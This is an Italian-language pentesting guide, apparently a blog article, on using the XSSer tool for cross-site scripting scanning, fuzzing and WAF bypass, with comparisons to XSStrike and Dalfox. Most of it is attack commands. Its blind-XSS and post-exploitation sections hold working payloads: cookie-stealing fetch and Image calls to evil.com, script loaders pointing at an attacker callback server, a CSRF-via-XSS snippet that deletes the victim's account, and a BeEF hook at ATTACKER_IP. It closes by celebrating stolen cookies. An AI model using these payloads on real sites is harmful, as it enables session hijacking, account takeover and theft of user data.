---
title: 'XSSer: Scanner XSS, Payload, Fuzzing e WAF Bypass'
slug: xsser
description: 'Guida pratica a XSSer per testare vulnerabilità XSS: installazione, scansione GET/POST, payload, fuzzing, encoding, bypass WAF e report dei risultati.'
image: /xsser-xss-exploitation-tool-hackita.webp
draft: true
date: 2026-08-10T00:00:00.000Z
categories:
  - tools
subcategories:
  - expoit
tags:
  - xsser
  - cross-site scripting
  - xss scanner
  - waf bypass
  - blind xss
  - xss automation
---

# XSSer: guida completa allo scanning XSS, fuzzing e WAF bypass

**XSSer** è un framework automatico per rilevare, sfruttare e reportare vulnerabilità [XSS](https://hackita.it/articoli/xss) nelle applicazioni web. Preinstallato su Kali Linux, offre oltre **1300 vettori di attacco pre-configurati** e tecniche di bypass per WAF noti — PHPIDS, Imperva, ModSecurity, Barracuda, F5, Sucuri e altri.

È scritto in Python 3 e si usa principalmente da riga di comando. Ha anche una GUI (xsser --gtk) ma nel contesto di un pentest si usa quasi sempre il CLI.

Importante capire subito una cosa: XSSer è uno dei tre strumenti principali per XSS automation, ognuno con un punto di forza diverso. **XSSer** è il più vecchio e il più completo in termini di payload pre-built. **XSStrike** è più intelligente nel costruire payload contestuali. **Dalfox** è il più veloce e adatto ai workflow di bug bounty moderni. Questa guida copre XSSer in dettaglio e posiziona gli altri due per scegliere lo strumento giusto nel momento giusto.

Prima di usare qualsiasi tool, però, serve capire cosa stai cercando. I tipi di XSS — [Reflected XSS](https://hackita.it/articoli/reflected-xss), [XSS Stored](https://hackita.it/articoli/xss-stored), [DOM XSS](https://hackita.it/articoli/dom-xss), [Blind XSS](https://hackita.it/articoli/blind-xss) — si comportano diversamente e richiedono approcci diversi.

***

## Installazione

```bash
# Kali/Parrot — già preinstallato
xsser --version

# Se non presente o vuoi l'ultima versione:
git clone https://github.com/epsylon/xsser
cd xsser
pip3 install -r requirements.txt
python3 xsser --version

# Dipendenze richieste:
# python3-pycurl, python3-bs4
sudo apt install python3-pycurl python3-bs4
```

***

## Sintassi Base e Logica di Funzionamento

XSSer funziona così: tu gli dai un URL con il parametro da testare marcato con la keyword `XSS`, e lui sostituisce `XSS` con ognuno dei suoi 1300+ payload, analizza le risposte e segnala quali hanno avuto successo.

```bash
# Struttura base: -u per URL, marca il parametro con XSS
xsser -u "https://target.com/search?q=XSS"

# Con cookie di sessione (per testare parametri autenticati)
xsser -u "https://target.com/search?q=XSS" \
  --cookie "PHPSESSID=abc123; session=xyz"

# Con custom header
xsser -u "https://target.com/search?q=XSS" \
  --header "Authorization: Bearer TOKEN"

# Su più parametri contemporaneamente
xsser -u "https://target.com/page?id=XSS&name=XSS&cat=XSS"
# Testa tutti e tre in parallelo
```

### GET vs POST

```bash
# Parametro GET (default)
xsser -u "https://target.com/search?q=XSS"

# Parametro POST
xsser -u "https://target.com/login" \
  -p "username=XSS&password=test"

# POST con content-type JSON
xsser -u "https://target.com/api/search" \
  -p '{"query":"XSS","lang":"it"}' \
  --header "Content-Type: application/json"
```

***

## Modalità di Discovery

### Scan su Lista di URL

```bash
# Da file (uno per riga, ognuno con XSS nel parametro)
xsser -i urls.txt

# Genera la lista di URL da testare con ffuf o waybackurls, poi la passi a xsser
# Con waybackurls (trova URL storici del dominio):
waybackurls target.com | grep "=" | \
  sed 's/=[^&]*/=XSS/g' > urls_to_test.txt
xsser -i urls_to_test.txt
```

### Crawl Automatico

```bash
# Crawla automaticamente tutto il target cercando parametri iniettabili
xsser --all "https://target.com"
# Attenzione: genera molto traffico — usa solo su target autorizzati

# Limita il crawl a un numero di pagine
xsser --all "https://target.com" --Cw 50
```

### Google Dork Integration

```bash
# Cerca target su DuckDuckGo con un dork, poi testa tutti i risultati
xsser -d "site:target.com inurl:search.php?q="
# --De per specificare il motore (default: DuckDuckGo)
xsser -d "inurl:index.php?page=" --De "google"
```

***

## Payload e Fuzzing

XSSer ha tre livelli di payload. Capire la differenza ti evita di usare sempre il modo più rumoroso.

```bash
# Livello 1: payload default (veloce, i classici alert/confirm/prompt)
xsser -u "https://target.com/search?q=XSS"

# Livello 2: fuzzing con payload aggiuntivi (--Fp)
xsser -u "https://target.com/search?q=XSS" \
  --Fp "<script>alert(1)</script>"
# Aggiunge il tuo payload custom alla lista dei test

# Livello 3: payload da file esterno
xsser -u "https://target.com/search?q=XSS" \
  --Fuzz /usr/share/seclists/Fuzzing/XSS/XSS-Cheat-Sheet-PortSwigger.txt

# Wordlist XSS utili da SecLists:
# /usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt
# /usr/share/seclists/Fuzzing/XSS/XSS-BruteLogic.txt
# /usr/share/seclists/Fuzzing/XSS/XSS-Cheat-Sheet-PortSwigger.txt
```

***

## Encodings e Bypass Filtri

Se l'applicazione filtra i payload di base, XSSer offre diverse tecniche di encoding. Puoi combinarle.

```bash
# Hex encoding (converte i caratteri in esadecimale)
xsser -u "https://target.com/search?q=XSS" --Hex

# URL encoding
xsser -u "https://target.com/search?q=XSS" --Url

# HTML entity encoding
xsser -u "https://target.com/search?q=XSS" --Hid

# Base64 (per contesti che decodificano base64 prima del render)
xsser -u "https://target.com/search?q=XSS" --B64

# Combinazione di encoding
xsser -u "https://target.com/search?q=XSS" --Hex --Url

# NULL byte injection (bypassare filtri che terminano alla prima nullbyte)
xsser -u "https://target.com/search?q=XSS" --Null

# Commenti HTML (spezzano il pattern del payload)
# <sc<!---->ript>alert(1)</sc<!---->ript>
xsser -u "https://target.com/search?q=XSS" --Str

# Maiuscole miste (bypassano filtri case-sensitive)
# <ScRiPt>alert(1)</sCrIpT>
xsser -u "https://target.com/search?q=XSS" --Une

# Inversione del payload
xsser -u "https://target.com/search?q=XSS" --Inv
```

***

## Bypass WAF Specifici

XSSer ha profili predefiniti per bypassare WAF noti. Quando sai o sospetti quale WAF protegge il target, usa il profilo corrispondente.

```bash
# Rileva automaticamente il WAF presente
xsser -u "https://target.com/search?q=XSS" --Waf

# Bypass per WAF specifici
xsser -u "https://target.com/search?q=XSS" --Phpids    # PHPIDS
xsser -u "https://target.com/search?q=XSS" --Imperva   # Imperva Incapsula
xsser -u "https://target.com/search?q=XSS" --Webknight # WebKnight
xsser -u "https://target.com/search?q=XSS" --F5        # F5 Big IP
xsser -u "https://target.com/search?q=XSS" --Barracuda # Barracuda
xsser -u "https://target.com/search?q=XSS" --Modsec    # ModSecurity
xsser -u "https://target.com/search?q=XSS" --Sucuri    # Sucuri WAF

# Bypass Chrome/Firefox (filtri XSS browser-side, ormai obsoleti)
xsser -u "https://target.com/search?q=XSS" --Chrome
xsser -u "https://target.com/search?q=XSS" --Firefox

# Combinazione: WAF detection + bypass ModSecurity + encoding URL
xsser -u "https://target.com/search?q=XSS" \
  --Waf --Modsec --Url --Str
```

Per la teoria sui bypass [XSS WAF](https://hackita.it/articoli/xss-waf-bypass) e [filtri](https://hackita.it/articoli/xss-filter-bypass) consulta le guide dedicate. Per i bypass della CSP: [xss-csp-bypass](https://hackita.it/articoli/xss-csp-bypass).

***

## Iniezione in Contesti Speciali

Non tutti i parametri XSS sono nella query string. XSSer può testare header HTTP, cookie, e contesti particolari.

```bash
# Iniezione nell'User-Agent
xsser -u "https://target.com/" \
  --Ua "XSS Mozilla/5.0"
# Utile se l'app logga o riflette l'User-Agent

# Iniezione nel Referer
xsser -u "https://target.com/" \
  --Referer "https://XSS.evil.com"

# Iniezione nei cookie
xsser -u "https://target.com/dashboard" \
  --cookie "user=XSS; session=abc123"
# Se il valore del cookie viene riflesso nella pagina senza encoding

# Cross Site Tracing (XST) — usa il metodo HTTP TRACE
# Il server restituisce la request completa inclusi header sensibili
xsser --xst "https://target.com"
# Se risponde con 200 e riflette la request → XST possibile
```

***

## Generazione di Vettori Speciali

```bash
# Crea un'immagine PNG con payload XSS nell'EXIF/metadata
# Utile per applicazioni che processano immagini e riflettono i metadata
xsser --imx exploit.png

# Crea un file Flash SWF con XSS (legacy, raro oggi)
xsser --fla exploit.swf

# Genera un report HTML dei risultati
xsser -u "https://target.com/search?q=XSS" \
  --save report_xss
# Crea report.xml e report.html con tutti i payload testati e risultati
```

***

## Comando Completo per un Pentest

```bash
# Scan completo con tutto attivato:
# - cookie di sessione
# - fuzzing con encodings multipli
# - bypass WAF rilevato automaticamente
# - payload aggiuntivi da SecLists
# - report HTML
xsser \
  -u "https://target.com/search?q=XSS" \
  --cookie "PHPSESSID=SESSION_ID" \
  --Waf \
  --Hex --Url --Str \
  --Fuzz /usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt \
  --save report_target \
  -v

# Su più URL da file (output di waybackurls/katana)
cat parameterized_urls.txt | \
  sed 's/=[^&]*/=XSS/g' | \
  sort -u > xsser_input.txt
xsser -i xsser_input.txt \
  --cookie "session=TOKEN" \
  --Hex --Url \
  --save mass_report
```

***

## XSSer vs XSStrike vs Dalfox: Quando Usare Quale

I tre tool hanno punti di forza diversi. Non sono in competizione — si usano in momenti diversi del pentest.

### XSStrike — Payload Contestuali e WAF Bypass Intelligente

XSStrike analizza il contesto in cui il parametro viene riflesso (dentro un tag HTML? in un attributo? in JavaScript?) e costruisce payload specifici per quel contesto. Non inietta payload generici — genera payload garantiti di funzionare in base all'analisi della risposta.

```bash
# Installazione
git clone https://github.com/s0md3v/XSStrike
cd XSStrike && pip3 install -r requirements.txt

# Scan base con analisi contestuale
python3 xsstrike.py -u "https://target.com/search?q=test"

# Con crawl dell'intero sito
python3 xsstrike.py -u "https://target.com" --crawl

# Solo DOM XSS
python3 xsstrike.py -u "https://target.com/page?id=test" --dom

# Con fuzzing aggressivo
python3 xsstrike.py -u "https://target.com/search?q=test" --fuzzer
```

**Usa XSStrike quando:** hai una WAF che blocca i payload classici di XSSer e devi costruire bypass contestuali. È più lento ma più preciso.

### Dalfox — Velocità e Pipeline Bug Bounty

Dalfox è scritto in Go, è estremamente veloce, supporta stored e DOM XSS, e si integra perfettamente nei workflow automatizzati di bug bounty. Supporta blind XSS con callback, output in JSON/SARIF, e pipe da altri tool.

```bash
# Installazione
go install github.com/hahwul/dalfox/v2@latest

# Scan base
dalfox url "https://target.com/search?q=test"

# Blind XSS con callback server (ezXSS o XSS Hunter)
dalfox url "https://target.com/search?q=test" \
  --blind "https://tua-istanza.ezxss.com"

# Pipe da katana o da una lista di URL — il workflow ideale per bug bounty
cat urls.txt | dalfox pipe

# Con cookie e header
dalfox url "https://target.com/search?q=test" \
  --cookie "session=TOKEN" \
  --header "Authorization: Bearer TOKEN"

# Output JSON per integrazione con altri tool
dalfox url "https://target.com/search?q=test" \
  -o results.json --format json

# Ignora parametri non iniettabili per velocità
dalfox url "https://target.com/search?q=test" --only-discovery-attack
```

**Usa Dalfox quando:** hai una lista grande di URL da testare velocemente (bug bounty con scope ampio), quando cerchi blind XSS, o quando vuoi integrare il tool in una pipeline automatizzata.

### Riepilogo Operativo

| Scenario                            | Tool consigliato        |
| ----------------------------------- | ----------------------- |
| Primo scan rapido su target singolo | XSSer                   |
| WAF che blocca payload classici     | XSStrike                |
| Scope grande, tanti URL da testare  | Dalfox                  |
| Blind XSS (no output visibile)      | Dalfox + ezXSS          |
| DOM XSS specifico                   | XSStrike o Dalfox --dom |
| Report automatico per cliente       | XSSer --save            |

***

## Blind XSS: Quando Non Vedi l'Output

Il [Blind XSS](https://hackita.it/articoli/blind-xss) è la variante in cui il payload viene eseguito in un contesto che non vedi — pannello admin, sistema di ticketing, email HTML, log viewer interno. Non puoi confermare il trigger guardando la risposta HTTP: hai bisogno di un callback server.

### Setup ezXSS (Self-Hosted)

```bash
# ezXSS è un pannello PHP che riceve i callback dai payload
git clone https://github.com/ssl/ezXSS
# Installa su un VPS con PHP + MySQL
# Accedi al pannello → ottieni il tuo script di callback unico

# Payload da iniettare (ezXSS genera lo snippet per te):
"><script src="https://tua-istanza.ezxss.com/ezXSS.js"></script>

# Quando il payload viene eseguito, ricevi nel pannello:
# - URL della pagina dove è stato eseguito
# - Cookie dell'utente che ha triggerato il payload
# - Screenshot della pagina
# - User-Agent e IP
# - Local Storage e Session Storage
```

### Payload Blind XSS Comuni

```javascript
// Classico: carica script esterno
"><script src="https://tua-istanza/callback.js"></script>

// Senza tag script (per contesti che filtrano <script>)
"><img src=x onerror="var s=document.createElement('script');s.src='https://tua-istanza/x.js';document.head.appendChild(s)">

// Per iniezione in attributi HTML
" onmouseover="var s=document.createElement('script');s.src='https://tua-istanza/x.js';document.head.appendChild(s)" x="

// Con Dalfox (gestisce tutto automaticamente):
dalfox url "https://target.com/contact?msg=XSS" \
  --blind "https://tua-istanza.ezxss.com"
```

***

## Post-Exploitation: Cosa Fare Dopo aver Trovato XSS

Trovare l'XSS è solo l'inizio. In un pentest vero, devi dimostrare l'impatto reale.

### Furto di Cookie e Session Hijacking

```javascript
// Invia il cookie al tuo server
fetch('https://evil.com/steal?c=' + document.cookie)

// Via immagine (bypassa alcune Content-Security-Policy)
new Image().src = 'https://evil.com/steal?c=' + encodeURIComponent(document.cookie)
```

Se i cookie hanno il flag `HttpOnly`, non sono accessibili da JavaScript — ma puoi comunque fare [session hijacking](https://hackita.it/articoli/session-hijacking) usando il cookie direttamente nelle request (keylogging, form hijacking, CSRF).

### CSRF via XSS

Un XSS bypassa completamente la protezione [CSRF](https://hackita.it/articoli/csrf) perché il codice esegue nel browser della vittima — ha accesso ai cookie e ai token CSRF presenti nella pagina.

```javascript
// Leggi il token CSRF dalla pagina e fai la request con esso
fetch('/account/settings')
  .then(r => r.text())
  .then(html => {
    const token = html.match(/csrf_token" value="([^"]+)"/)[1];
    return fetch('/account/delete', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'csrf_token=' + token + '&confirm=yes'
    });
  });
```

### BeEF (Browser Exploitation Framework)

Per una dimostrazione di impatto completa in un pentest, [BeEF](https://hackita.it/articoli/beef) permette di hoockare il browser della vittima via XSS e controllarlo in tempo reale.

```javascript
// Payload BeEF (hook il browser della vittima)
"><script src="http://ATTACKER_IP:3000/hook.js"></script>
// Da questo punto in poi hai controllo del browser nel pannello BeEF
```

***

## Workflow Operativo Completo

Questo è il flusso che segui in un pentest su applicazione web:

**Fase 1 — Identificazione manuale dei punti di iniezione**

Prima di usare tool, identifica manualmente dove l'input viene riflesso. In Burp Suite, cerca risposte HTTP che contengono il valore che hai inviato nel parametro. Quelli sono i tuoi candidati. I payload da passare da [xss-payload-list](https://hackita.it/articoli/xss-payload-list).

```bash
# Payload di test iniziale (semplice, non esegue codice):
test1234xss
# Cerca "test1234xss" nella risposta — se compare, è un punto di riflessione
```

**Fase 2 — Test manuale del contesto**

Capisce dove finisce la riflessione:

```html
<!-- Nel testo → prova: <script>alert(1)</script> -->
<p>Risultato per: TUYINPUT</p>

<!-- In un attributo → prova: " onmouseover="alert(1) -->
<input value="TUOINPUT">

<!-- In JavaScript → prova: ';alert(1);// -->
<script>var x = 'TUOINPUT';</script>
```

**Fase 3 — Automazione con XSSer/XSStrike/Dalfox**

```bash
# XSSer per coverage ampia (1300+ payload)
xsser -u "https://target.com/search?q=XSS" --Hex --Url --Waf

# XSStrike se XSSer fallisce (WAF presente)
python3 xsstrike.py -u "https://target.com/search?q=test"

# Dalfox per scope ampio
cat all_urls.txt | sed 's/=[^&]*/=FUZZ/g' | dalfox pipe
```

**Fase 4 — Blind XSS su tutti gli input che non riflettono**

```bash
# Inietta payload blind in ogni campo che va "da qualche parte"
# Form di contatto, commenti, username, bio, subject di ticket
dalfox url "https://target.com/contact" \
  -p "name=test&email=test@test.com&message=XSS_PAYLOAD" \
  --blind "https://tua-istanza.ezxss.com"
```

**Fase 5 — Dimostrazione impatto**

```javascript
// Prova impatto minimo accettabile per il report:
alert(document.domain)       // conferma esecuzione nel dominio corretto
alert(document.cookie)       // mostra cookie accessibili
fetch('https://evil.com?c='+document.cookie)  // exfiltrazione
```

***

## Checklist

```
IDENTIFICAZIONE
☐ Parametri GET/POST che riflettono l'input nella risposta
☐ Header riflessi (User-Agent, Referer, cookie)
☐ Risposte JSON con valori riflessi nel frontend
☐ Input "nascosti" (form di contatto, commenti, username, bio)

TEST MANUALE
☐ test1234xss → compare nella risposta?
☐ Contesto identificato (tag HTML, attributo, JavaScript, URL)
☐ Payload base testato per il contesto
☐ HttpOnly sui cookie? (cambia il payload di exploitation)

AUTOMAZIONE
☐ XSSer -u URL con parametro marcato XSS
☐ Encoding testati: --Hex --Url --Str --B64
☐ WAF rilevato: --Waf → bypass specifico applicato
☐ XSStrike su parametri che XSSer non riesce a bucare
☐ Dalfox pipe su lista URL completa del sito

BLIND XSS
☐ Payload blind iniettato in form di contatto, commenti, ticket, username
☐ ezXSS o XSS Hunter configurato e in ascolto
☐ Callback ricevuto → URL, cookie, screenshot annotati

POST-EXPLOITATION
☐ document.domain confermato (stesso dominio target)
☐ Cookie accessibili? HttpOnly?
☐ CSRF token leggibile dalla pagina?
☐ Azioni sensibili eseguibili via XSS (cambio email, delete account)
☐ BeEF hookato per demo impatto completo (se in scope)

DOCUMENTAZIONE
☐ Screenshot payload iniettato
☐ Screenshot alert/esecuzione nel browser
☐ Screenshot callback blind XSS (se applicabile)
☐ Dimostrazione impatto (cookie esfiltrati, azione eseguita)
```

***

## FAQ

**XSSer, XSStrike o Dalfox: con quale inizio?**
In un pentest su target singolo: inizia con XSSer per la coverage ampia. Se blocchi su WAF, passa a XSStrike per i bypass contestuali. In un bug bounty con scope largo e tanti URL: Dalfox direttamente via pipe.

**XSSer non trova nulla ma so che c'è una XSS. Perché?**
Tre cause principali: (1) il WAF sta bloccando i payload — prova `--Waf` e i bypass specifici; (2) la XSS è DOM-based — XSSer non analizza JavaScript, usa XSStrike con `--dom` o Dalfox; (3) la XSS è blind — l'output non torna nella risposta HTTP, serve un callback server.

**Come testo i parametri POST con XSSer?**
Con il flag `-p`: `xsser -u "https://target.com/form" -p "campo=XSS&altro=valore"`. Se il campo è JSON: aggiungi `--header "Content-Type: application/json"` e usa il formato corretto nel parametro.

**Il cookie ha HttpOnly. Posso ancora sfruttare la XSS?**
Sì. HttpOnly impedisce l'accesso via `document.cookie`, ma non blocca: form hijacking (leggi e submitti form con dati sensibili), keylogging, CSRF via XSS (hai i token nella pagina), screenshot della pagina, redirect della vittima. L'impatto rimane alto anche senza accesso ai cookie.

**Devo usare un VPS per il callback del blind XSS?**
Sì, hai bisogno di un server raggiungibile pubblicamente. Le opzioni: VPS con ezXSS installato (self-hosted, il più sicuro), istanza cloud temporanea, oppure ngrok per esporre un server locale. In un programma di bug bounty verifica se il provider (XSS Hunter, Burp Collaborator) è nella lista dei tool permessi.

***

## Risorse

* [XSSer GitHub](https://github.com/epsylon/xsser) — repository ufficiale e documentazione
* [XSStrike GitHub](https://github.com/s0md3v/XSStrike) — payload contestuali e WAF bypass
* [Dalfox GitHub](https://github.com/hahwul/dalfox) — scanner Go per pipeline bug bounty
* [ezXSS](https://github.com/ssl/ezXSS) — piattaforma self-hosted per blind XSS
* [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

***

> Hai iniettato il payload. Il pannello admin ha caricato il tuo script. I cookie sono a casa tua.
